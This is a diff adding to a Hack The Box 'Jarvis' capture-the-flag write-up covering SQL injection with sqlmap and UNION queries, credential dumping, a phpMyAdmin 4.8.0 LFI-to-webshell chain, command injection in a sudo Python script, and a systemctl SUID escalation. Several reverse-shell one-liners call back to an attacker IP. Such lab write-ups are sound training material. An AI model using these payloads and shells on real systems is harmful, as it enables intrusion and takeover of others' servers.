@@ -9,7 +9,7 @@ menu:
     parent: htb-machines-linux
     weight: 10
 hero: images/jarvis.png
-tags: ["HTB"]
+tags: ["HTB", "waf", "sqli", "injection", "sqlmap", "phpmyadmin", "cve-2018-12613", "python", "systemctl", "service", "gtfobins", "command-injection"]
 ---
 
 # Jarvis
@@ -97,3 +97,223 @@ Starting gobuster in directory enumeration mode
 /room.php             (Status: 302) [Size: 3024] [--> index.php]
 /sass                 (Status: 301) [Size: 311] [--> http://10.10.10.143/sass/]
 ```
+
+## Foothold
+- Clicking around the page, we get to `room.php` with `cod` parameters which returns rooms based on `id`
+  - If add `'` to parameter, the page breaks
+
+![](./images/3.png)
+
+![](./images/4.png)
+
+- Let's try `sqlmap`
+
+```
+└─$ sqlmap -u http://10.10.10.143/room.php?cod=1 --batch                                                              
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.7.9#stable}
+|_ -| . [)]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+<SNIP>
+GET parameter 'cod' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 324 HTTP(s) requests:
+---
+Parameter: cod (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cod=1 AND 2368=2368
+---
+[13:40:12] [INFO] testing MySQL
+[13:40:12] [INFO] confirming MySQL
+[13:40:13] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Debian 9 (stretch)
+web application technology: Apache 2.4.25, PHP
+back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
+[13:40:14] [WARNING] HTTP error codes detected during run:
+404 (Not Found) - 226 times
+[13:40:14] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.10.143'
+
+[*] ending @ 13:40:14 /2023-10-28/
+
+```
+
+- I dumped the databases
+  - `hotel` had only rooms
+  - So I dumped `mysql.user` table
+  - By the way, `sqlmap` after a while will get banned by `WAF`
+  - So we have to do it manually
+  - `http://10.10.10.143/room.php?cod=1000+union+select+1,2,3,4,5,6,7;-- -`
+  - `http://10.10.10.143/room.php?cod=1000+union+select+1,group_concat(user),3,group_concat(password),5,6,7+from+mysql.user;-- -`
+
+![](./images/5.png)
+
+![](./images/6.png)
+
+- Now we can login to `phpmyadmin`
+  - `DBadmin:imissyou`
+
+![](./images/7.png)
+
+- We have a `PHPMyAdmin 4.8.0` which has a [RCE](https://www.exploit-db.com/exploits/50457)
+  - https://medium.com/@happyholic1203/phpmyadmin-4-8-0-4-8-1-remote-code-execution-257bcc146f8e
+  - There is a `LFI` in `index.php`
+    - http://10.10.10.143/phpmyadmin/index.php?target=db_sql.php%3f/../../../../etc/passwd
+
+![](./images/8.png)
+
+- Next we open `SQL` windows and run `SELECT '<?php system($_REQUEST["cmd"]);?>' ` query
+  - Paste query and click `Go`
+
+![](./images/9.png)
+
+
+- Then we visit `http://10.10.10.143/phpmyadmin/index.php?target=db_sql.php%3f/../../../../../var/lib/php/sessions/sess_<PHPMYADMIN_SESSION>&cmd=id`
+
+![](./images/10.png)
+
+- We have our `rce`, let's get reverse shell
+  - url-encoded: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.16.4 6666 >/tmp/f`
+
+![](./images/11.png)
+
+- There is another way to get a reverse shell via [SQLi](https://0xdf.gitlab.io/2019/11/09/htb-jarvis.html#path-2-webshell-via-sqli)
+## User
+- `sudo`
+```
+www-data@jarvis:/usr/share/phpmyadmin$ sudo -l
+Matching Defaults entries for www-data on jarvis:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on jarvis:
+    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
+```
+
+- We can execute `simpler.py` as `pepper`
+```
+www-data@jarvis:/usr/share/phpmyadmin$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -h
+***********************************************
+     _                 _                       
+ ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
+/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
+\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
+|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
+                |_|               |_|    |___/ 
+                                @ironhackers.es
+                                
+***********************************************
+
+
+********************************************************
+* Simpler   -   A simple simplifier ;)                 *
+* Version 1.0                                          *
+********************************************************
+Usage:  python3 simpler.py [options]
+
+Options:
+    -h/--help   : This help
+    -s          : Statistics
+    -l          : List the attackers IP
+    -p          : ping an attacker IP
+```
+
+- I checked the content of the script
+  - `ping` looks interesting
+
+```
+...
+
+def exec_ping():
+    forbidden = ['&', ';', '-', '`', '||', '|']
+    command = input('Enter an IP: ')
+    for i in forbidden:
+        if i in command:
+            print('Got you')
+            exit()
+    os.system('ping ' + command)
+...
+```
+
+- It has banned chars, except `$(<COMMAND>)`
+  - Let's try it
+  - I'll create a script
+```
+#!/bin/bash
+
+/bin/bash -i >& /dev/tcp/10.10.16.4/7777 0>&1
+
+```
+
+- Run `simpler.py` and enter for IP prompt `$(/tmp/rev.sh)`
+
+```
+www-data@jarvis:/tmp$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p 
+***********************************************
+     _                 _                       
+ ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
+/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
+\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
+|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
+                |_|               |_|    |___/ 
+                                @ironhackers.es
+                                
+***********************************************
+
+Enter an IP: $(/tmp/rev.sh)
+```
+
+- We receive our shell
+
+![](./images/12.png)
+## Root
+- `linpeas` show `systemctl` has `suid` set
+```
+╔══════════╣ SUID - Check easy privesc, exploits and write perms
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                                                                                            
+strace Not Found                                                                                                                                                                                                                            
+-rwsr-xr-x 1 root root 31K Aug 21  2018 /bin/fusermount                                                                                                                                                                                     
+-rwsr-xr-x 1 root root 44K Mar  7  2018 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
+-rwsr-xr-x 1 root root 60K Nov 10  2016 /bin/ping
+-rwsr-x--- 1 root pepper 171K Jun 29  2022 /bin/systemctl
+-rwsr-xr-x 1 root root 31K Mar  7  2018 /bin/umount  --->  BSD/Linux(08-1996)
+-rwsr-xr-x 1 root root 40K Mar 17  2021 /bin/su
+-rwsr-xr-x 1 root root 40K Mar 17  2021 /usr/bin/newgrp  --->  HP-UX_10.20
+-rwsr-xr-x 1 root root 59K Mar 17  2021 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
+-rwsr-xr-x 1 root root 75K Mar 17  2021 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 40K Mar 17  2021 /usr/bin/chsh
+-rwsr-xr-x 1 root root 138K Jan 23  2021 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
+-rwsr-xr-x 1 root root 49K Mar 17  2021 /usr/bin/chfn  --->  SuSE_9.3/10
+-rwsr-xr-x 1 root root 10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x 1 root root 431K Mar  1  2019 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-- 1 root messagebus 42K Jun  9  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+```
+
+- [GTFOBins](https://gtfobins.github.io/gtfobins/systemctl/)
+  - Create a `<filename>.service` file
+```
+[Service]
+Type=oneshot
+ExecStart=/bin/bash -c "nc 10.10.16.4 8888 -e /bin/bash"
+KillMode=process
+
+[Install]
+WantedBy=multi-user.target
+
+```
+
+- Then we link the service
+  - Make sure to place the file in `/dev/shm`
+    - I tried placing it in `/tmp`, it didn't work
+  - Start the service
+    - If you change service file, make sure to run `systemctl daemon-reload`
+```
+pepper@jarvis:/dev/shm$ nano rev.service
+pepper@jarvis:/dev/shm$ systemctl link /dev/shm/rev.service  
+Created symlink /etc/systemd/system/rev.service -> /dev/shm/rev.service.
+pepper@jarvis:/dev/shm$ systemctl start rev
+
+```
+
+![](./images/13.png)
